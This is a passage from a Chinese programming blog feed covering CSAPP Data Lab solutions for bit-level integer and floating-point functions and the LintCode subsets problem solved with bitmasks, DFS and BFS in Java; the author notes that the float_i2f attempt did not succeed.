<li><p>如果上一步中得到的ans = 0, 则需要判断的是ans是在[0, 8]区间还是[8, 16]区间，将x右移8位，判断x的第8 - 32位是否包含1(因为上一步的ans=0已经说明了第17位到第32位全是0了，这里实际上只在判断第8 到16位) 如果包含1 则b=1, ans = 8。如果全是0，则b=0,ans = 0</p>
</li>
</ul>
<p>之后用同样的方法求cde得到最终的ans</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  ans = ans + (!!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  ans = ans + (!!(x &gt;&gt; (<span class="number">8</span> + ans))) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  ans = ans + (!!(x &gt;&gt; (<span class="number">4</span> + ans))) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  ans = ans + (!!(x &gt;&gt; (<span class="number">2</span> + ans))) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  ans = ans + (!!(x &gt;&gt; (<span class="number">1</span> + ans))) &lt;&lt; <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Float-Point-Operation"><a href="#Float-Point-Operation" class="headerlink" title="Float Point Operation"></a>Float Point Operation</h1><p>这部分的要求是</p>
<ol>
<li>禁止使用宏(macros)</li>
<li>禁止调用函数</li>
<li>禁止casting</li>
<li>禁止使用int和unsigned以外的</li>
</ol>
<h2 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这一题实际上就是让我们判断一个数是否是NaN，如果是NaN则原封不动返回，如果不是则把符号位取反即可。 NAN满足两个条件，exp全部为1， M不全位0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> exp_all_1 = !(((uf &gt;&gt; <span class="number">23</span>) + <span class="number">1</span>) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">   <span class="keyword">int</span> m_not_all_zero = !!(uf &amp; <span class="number">0x007fffff</span>);</span><br><span class="line">   <span class="keyword">if</span> (exp_all_1 &amp; m_not_all_zero)&#123;</span><br><span class="line">       <span class="keyword">return</span> uf;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> uf ^ <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者用另一种办法来判断是否为NaN。这里要理解浮点数在数轴上的对应关系</p>
<p><img src="http://wdxtub.com/images/14609523456310.jpg" alt=""></p>
<p>或者我们把8bit的的浮点数正数部分全部写出来，可以发现我们把这个8bit按int的方式看，当这8bit数值变大的时候 该浮点数value的值也在变大 。所有比0b0-0001-000小的数字都是非规范数字，所有比0b0-1111-000大的数字都是NaN</p>
<p><img src="/images/CSAPP/float.jpg" alt="floating point"></p>
<p>那么就可以首先把浮点数变为正数tmp，然后如果这个正数大于 0x7f800000，则说明这个数是NaN。 这个方法很巧妙， 要好好理解上面的图</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> tmp = uf&amp;(<span class="number">0x7fffffff</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> result = uf^(<span class="number">0x80000000</span>);</span><br><span class="line">  <span class="keyword">if</span>(tmp&gt;<span class="number">0x7f800000</span>) result=uf;<span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>这个题真的是，卡了我两天。最后也没有做得出来，我的方法是</p>
<ol>
<li>提取x的符号位 sign</li>
<li>根据之前写过的ilog2函数来计算x中最高位1的位置highest</li>
<li>把x最高位的1删除掉（因为浮点数的frac部分默认呆了一个1）</li>
<li>判断进位问题，这里需要对highest-1和23进行比较，第0位到第highest-1位是x的frac，如果highest-1比23要小，则需要对x进行左移，这里没有进位问题。 如果highest-1比23要大，则需要考虑进位。进位是最麻烦的，如果超过一半则进位，小于一半则不进位，刚好落在一半的位置上（比如10.1100 我们要保留小数点后1位）的时候需要保证舍入后最后一位是偶数。eg: 10.001100 保留3位小数结果就是10.010 而10.010100保留3位小数的结果就是10.010。</li>
<li>移位之后的x就是frac部分，而exp部分则需要加上一个bias127<br>6.把sign exp frac部分取或</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">unsigned float_i2f(int x) &#123;</span><br><span class="line">  if(x == 0) return 0;</span><br><span class="line">  int sign = (1 &lt;&lt; 31) &amp; x;</span><br><span class="line">  if(sign)&#123;</span><br><span class="line">     x = -x;</span><br><span class="line">  &#125;</span><br><span class="line">  // highest 是最高位1的位置</span><br><span class="line">  int highest = ilog2(x) + 1;</span><br><span class="line">  printf(&quot;highest : %d\n&quot;, highest);</span><br><span class="line">  // 把最高位的1删掉</span><br><span class="line">  x = x ^ (1 &lt;&lt; (highest-1));</span><br><span class="line">  if(highest &gt; 24)&#123;</span><br><span class="line">        unsigned guard_bit = (1 &lt;&lt; (highest - 24)) &amp; x;</span><br><span class="line">        printf(&quot;guard_bit: %x\n&quot;, guard_bit);</span><br><span class="line">        unsigned round_bit = (1 &lt;&lt; (highest - 24 - 1)) &amp; x;</span><br><span class="line">        unsigned sticky_bit = !!((round_bit - 1) &amp; x);</span><br><span class="line">        if(round_bit &amp;&amp; sticky_bit)&#123;</span><br><span class="line">            x = x &gt;&gt; (highest - 24) + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(guard_bit &amp;&amp; round_bit &amp;&amp; !sticky_bit)&#123;</span><br><span class="line">            x = x &gt;&gt; (highest - 24) + 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x = x &gt;&gt; (highest - 24);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      x = x &lt;&lt; (24 - highest);</span><br><span class="line">  &#125;</span><br><span class="line">  unsigned frac = x;</span><br><span class="line">  unsigned exp = (highest - 1 + 127) &lt;&lt; 23;</span><br><span class="line">  unsigned ans =  sign | exp | frac;</span><br><span class="line">  return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里判断进位的方法是<br><img src="/images/CSAPP/进位.jpg" alt="进位"></p>
<h2 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>首先排除NaN，和+-0 这里需要注意的是<strong>对于浮点数是有正负0的</strong> 。 排除完特殊情况之后需要分为规范数和非规范树两种。规范数乘2就是把exp加一，而非规范树乘2则是给frac左移1位，注意这里左移如果能溢出，则给exp变成1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(uf == <span class="number">0</span> || uf == <span class="number">0x80000000</span>) <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="keyword">unsigned</span> tmp = uf &amp; (<span class="number">0x7fffffff</span>);</span><br><span class="line">  <span class="keyword">if</span>(tmp &gt;= <span class="number">0x7f800000</span>) <span class="keyword">return</span> uf; <span class="comment">//这里要用&gt;=是因为inf不能乘二</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="built_in">exp</span>  = uf &amp; <span class="number">0x7f800000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = uf &amp; <span class="number">0x007fffff</span>;;</span><br><span class="line">  <span class="keyword">if</span>( !<span class="built_in">exp</span> )&#123; <span class="comment">//如果exp全位0 则是非规范数 对frac左移实现二倍</span></span><br><span class="line">      <span class="built_in">exp</span>  = (frac &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x00800000</span>;</span><br><span class="line">      frac = (frac &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">//exp不全为零，是规范数，对exp加一翻倍</span></span><br><span class="line">      <span class="built_in">exp</span>  = (<span class="built_in">exp</span> + <span class="number">0x00800000</span>) &amp; <span class="number">0x7f800000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &amp; <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> ans = sign | <span class="built_in">exp</span> | frac;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>真！的！难！ 但是也从这个实验中比较清楚地理解和体会了计算机中整数和浮点数的表示 感触很深的几点是：</p>
<ul>
<li>整数的two‘s complement，以及为什么要用这种方式来表示负数，为什么要用补码( <strong>计算机在做减法运算的时候实际上内部是在做加法运算</strong>， 例如1-1的运算，如果我们将1表示为<code>00000001</code>，将-1表示为<code>10000001</code> 那么1-1在计算机中的运算结果就是<code>00000001+10000001 = 10000010</code>很明显结果不对。而如果我们把-1表示为<code>11111111</code>，那1-1的结果就是<code>000000001+11111111 = 00000000</code>这个运算出现了最高位溢出的情况)</li>
<li>浮点数在数轴上的映射关系。 规范数和非规范数。</li>
</ul>
<p>还有一些细节</p>
<ol>
<li>bit的四大基本操作 &amp; | ^ ~ 及其与集合操作的对应关系，可以联想到二进制在subset这种题目中的应用</li>
<li>逻辑左移和算术左移（总弄不清楚这俩），逻辑是补0，算术是补符号位。 C语言中默认是算术右移</li>
<li>signed和unsigned之间的casting规则，bit pattern is maintained but reinterpreted. 表达式中同时含有unsigned和signed的时候，int默认当成unsigned。expanding规则是之间填充符号位（例如short–&gt;int)；</li>
<li>对x取反的时候，要考虑-32768这个特例，会overflow</li>
<li>浮点数存在正负0； 浮点数的rounding规则</li>
<li>double可以精确表示一个int 但是float不能</li>
</ol>
<p>第一个实验就这么难了，后面的实验。。。哈哈哈 加油了</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[LintCode-subsets]]></title>
      <url>/2018/01/14/Algorithms/LintCode-subsets/</url>
      <content type="html"><![CDATA[<h2 id="LintCode17-subsets题解"><a href="#LintCode17-subsets题解" class="headerlink" title="LintCode17- subsets题解"></a>LintCode17- subsets题解</h2><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个含不同整数的集合，返回其所有的子集。</p>
<p><strong> Examples </strong> :</p>
<p>如果 S = <code>[1,2,3]</code>，有如下的解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [1],</span><br><span class="line">  [2],</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [1,3],</span><br><span class="line">  [2,3],</span><br><span class="line">  [1,2],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>思路就是使用一个<code>正整数</code>二进制表示的<code>第i位</code>是1还是0来代表集合的<code>第i个数取或者不取</code>。所以从<code>0到2^n-1</code>总共<code>2^n</code>个整数，正好对应集合的2^n个子集。如下是就是 <code>整数 &lt;=&gt; 二进制 &lt;=&gt; 对应集合</code> 之间的转换关系</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> S: A set of numbers.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>: A list of lists. All valid subsets.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; subsets(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1 &lt;&lt; n is 2^n</span></span><br><span class="line">        <span class="comment">// each subset equals to an binary integer between 0 .. 2^n - 1</span></span><br><span class="line">        <span class="comment">// 0 -&gt; 000 -&gt; []</span></span><br><span class="line">        <span class="comment">// 1 -&gt; 001 -&gt; [1]</span></span><br><span class="line">        <span class="comment">// 2 -&gt; 010 -&gt; [2]</span></span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line">        <span class="comment">// 7 -&gt; 111 -&gt; [1,2,3]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">            List&lt;Integer&gt; subset = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="comment">// check whether the jth digit in i's binary representation is 1</span></span><br><span class="line">                <span class="keyword">if</span> ((i &amp; (<span class="number">1</span> &lt;&lt; j)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    subset.add(nums[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result.add(subset);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个算法对于数组中有重复元素的情况（<a href="http://www.lintcode.com/zh-cn/problem/subsets-ii" target="_blank" rel="noopener">LintCode-subset-ii</a>）也同样适用，但是在result.add(subset)的时候需要去重，去重操作比较麻烦</p>
<h2 id="DFS搜索"><a href="#DFS搜索" class="headerlink" title="DFS搜索"></a>DFS搜索</h2><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> S: A set of numbers.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>: A list of lists. All valid subsets.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; subsets(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> results;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            results.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">            <span class="keyword">return</span> results;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        helper(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(), nums, <span class="number">0</span>, results);</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 递归三要素</span></span><br><span class="line">    <span class="comment">// 1. 递归的定义：在 Nums 中找到所有以 subset 开头的的集合，并放到 results</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(ArrayList&lt;Integer&gt; subset,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">int</span>[] nums,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">int</span> startIndex,</span></span></span><br><span class="line"><span class="function"><span class="params">                        List&lt;List&lt;Integer&gt;&gt; results)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 2. 递归的拆解</span></span><br><span class="line">        <span class="comment">// deep copy</span></span><br><span class="line">        <span class="comment">// results.add(subset);</span></span><br><span class="line">        results.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(subset));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="comment">// [1] -&gt; [1,2]</span></span><br><span class="line">            subset.add(nums[i]);</span><br><span class="line">            <span class="comment">// 寻找所有以 [1,2] 开头的集合，并扔到 results</span></span><br><span class="line">            helper(subset, nums, i + <span class="number">1</span>, results);</span><br><span class="line">            <span class="comment">// [1,2] -&gt; [1]  回溯</span></span><br><span class="line">            subset.remove(subset.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 递归的出口</span></span><br><span class="line">        <span class="comment">// return;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用的是深度优先搜索，可以看到我们从[]空集开始，先把以[1]开头的子集找全之后，再回溯，去找以[2]开头的子集。深度是优先于宽度的，所以是深度优先搜索。这里递归的出口不用写是因为，当我们的startIndex等于nums的长度的时候程序不会进入循环，自己就会返回。 加入result的顺序是 :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//把这个图横过来看.. </span><br><span class="line">[] -&gt; [1] -&gt; [1,2] -&gt; [1,2,3]</span><br><span class="line">          -&gt; [1,3]</span><br><span class="line">   -&gt; [2] -&gt; [2,3]</span><br><span class="line">   -&gt; [3]</span><br></pre></td></tr></table></figure></p>
<p>这里引入startIndex这一参数的原因是确保同一元素最多只会被一个subset选择一次</p>
<h3 id="带重复元素的子集"><a href="#带重复元素的子集" class="headerlink" title="带重复元素的子集"></a>带重复元素的子集</h3><p>对于带重复元素的子集，程序主体不变，需要在进入helper的循环之前加入依据判断</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = startIndex; i &lt; nums.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i!= startIndex &amp;&amp; nums[i] == nums[i-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    subset.add(nums[i]);</span><br><span class="line">    helper(subset, nums, i+<span class="number">1</span>, results);</span><br><span class="line">    subset.remove(subset.size() - <span class="number">1</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里nums[i] == nums[i-1]这个条件很好理解，但是第一个条件不是很直观，我们来通过一个实例来理解一下。假如我们的集合是<code>[1,1,3]</code> 当我们搜索到第一个1的时候正常进入helper函数，</p>
<ul>
<li>从[]出发，i=0,把1加入subset中，调用helper([1], nums, 1, results)，在helper中：<ul>
<li>在results中加入[1]， 此时results为[[], [1]]</li>
<li>i=1, 不满足i!=startIndex, 将第二个1加入subsets,调用helper([1,1], nums, 2, results)。 这次调用返回后results会是[[], [1], [1,1], [1,1,3]]</li>
<li>i=2,将3加入subsets，调用helper([1,3], nums, 3, results) 这次因为startIndex = nums.length了不再进入循环</li>
</ul>
</li>
<li>把第一个1删去(回溯), 再次从[]出发，i=1, 这次因为i!= startIndex 且 nums[i] == nums[i-1]将会调过对这个1的搜索</li>
<li>再次回溯，从[]出发，i=2, 对[3]开头的子集进行搜索</li>
</ul>
<p>从这个实例可以看出 i!=startIndex是为了使集合中[1,1] [1,1,3]这样的子集能够正常出现, 而nums[i]==nums[i-1]则是为了防止出现两个[1,3]的情况</p>
<h2 id="BFS搜索"><a href="#BFS搜索" class="headerlink" title="BFS搜索"></a>BFS搜索</h2><p>使用宽度优先搜索BFS的，一层一层的找到所有子集：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[] </span><br><span class="line">[1] [2] [3]</span><br><span class="line">[1, 2] [1, 3] [2, 3]</span><br><span class="line">[1, 2, 3]</span><br></pre></td></tr></table></figure></p>
<h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @param nums: A set of numbers</span></span><br><span class="line"><span class="comment">     * @return: A list of lists</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; subsets(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; results = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="keyword">null</span>) &#123;</span><br><span class="line">       